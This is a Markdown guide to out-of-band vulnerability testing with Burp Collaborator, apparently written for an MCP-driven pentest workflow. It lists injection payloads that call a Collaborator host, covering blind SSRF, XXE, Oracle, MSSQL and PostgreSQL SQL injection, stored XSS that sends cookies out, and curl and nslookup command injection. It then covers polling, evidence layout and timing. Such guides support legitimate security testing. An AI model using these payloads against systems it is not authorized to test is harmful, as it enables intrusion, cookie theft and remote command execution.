# Burp Collaborator OOB Testing

## Overview

Collaborator detects blind/out-of-band vulnerabilities by providing unique payloads that trigger DNS/HTTP/SMTP callbacks when a vulnerability exists.

## Workflow

### 1. Generate Payloads

```
Via MCP → Request Collaborator payload
Returns: {payload_id}.burpcollaborator.net (or private server domain)
```

### 2. Inject Payloads

**Blind SSRF**:
```
param=http://{payload_id}.burpcollaborator.net
X-Forwarded-For: http://{payload_id}.burpcollaborator.net
Referer: http://{payload_id}.burpcollaborator.net
```

**Blind XXE**:
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{payload_id}.burpcollaborator.net/xxe">
]>
<root>&xxe;</root>
```

**Blind SQL Injection**:
```sql
-- Oracle
SELECT UTL_HTTP.REQUEST('http://{payload_id}.burpcollaborator.net/'||(SELECT user FROM dual)) FROM dual
-- MSSQL
EXEC master..xp_dirtree '\\{payload_id}.burpcollaborator.net\share'
-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'nslookup {payload_id}.burpcollaborator.net'
```

**Blind XSS (stored)**:
```html
<img src=http://{payload_id}.burpcollaborator.net/xss>
<script>fetch('http://{payload_id}.burpcollaborator.net/'+document.cookie)</script>
```

**Blind OS Command Injection**:
```
; nslookup {payload_id}.burpcollaborator.net
| curl http://{payload_id}.burpcollaborator.net/cmd
`nslookup {payload_id}.burpcollaborator.net`
```

### 3. Poll for Interactions

```
Via MCP → Poll Collaborator for payload_id
Returns: {interaction_type, timestamp, client_ip, raw_data}
```

**Interaction types**:
- **DNS**: Target resolved the Collaborator domain
- **HTTP**: Target made HTTP request to Collaborator
- **SMTP**: Target sent email (email header injection)

### 4. Correlate and Document

Map interactions back to injected payloads:
- Which parameter triggered the callback?
- What data was exfiltrated (if any)?
- DNS-only vs HTTP — DNS confirms reachability, HTTP confirms full SSRF

## Private Collaborator Server

For sensitive engagements where data shouldn't reach PortSwigger:

1. Deploy Collaborator server on your infrastructure
2. Configure wildcard DNS for your domain
3. Configure Burp: Project Options → Misc → Burp Collaborator Server → Use private server
4. Provide domain and polling location

## Evidence Format

```
outputs/<target>/findings/finding-NNN/burp-evidence/collaborator/
├── payload-injection.txt    # Request with injected payload
├── interaction-log.json     # Collaborator poll results
└── correlation.md           # Payload → interaction mapping
```

## Timing Considerations

- Poll **immediately** after injection (some callbacks are instant)
- Poll again after **30 seconds**, **5 minutes**, **1 hour**
- Stored XSS callbacks may arrive days later (when admin views page)
- DNS interactions may not include request data — use HTTP for data exfiltration proof
